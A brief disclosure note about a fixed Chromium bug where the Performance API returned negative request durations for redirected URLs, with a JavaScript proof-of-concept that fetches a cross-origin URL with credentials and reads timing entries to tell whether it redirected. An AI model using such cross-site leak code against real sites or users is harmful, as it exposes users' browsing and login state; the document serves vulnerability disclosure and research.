---
title: Performance API time travel on redirect (Fixed)
---

The Performance API leaked if a URL was a redirect by returning a negative number.

```js
async function isRedirected(url) {
  let href = new URL(url).href;
  await fetch(href, {mode: 'no-cors', credentials: 'include'});
  // Wait for request to be added to performance.getEntriesByName();
  await new Promise((r) => setTimeout(r, 200));
  // Get last added timings
  let res = performance.getEntriesByName(href).pop();
  console.log('Request duration: ' + res.duration);
  if (res.duration >= 0) return false;
  if (res.duration > -10) console.log('Redirect was cached');
  return true;
}
```

This was fixed in <https://issues.chromium.org/issues/40054148>  
Not rewarded as [posted](https://github.com/xsleaks/wiki/pull/69) publicly on the xsleaks wiki.
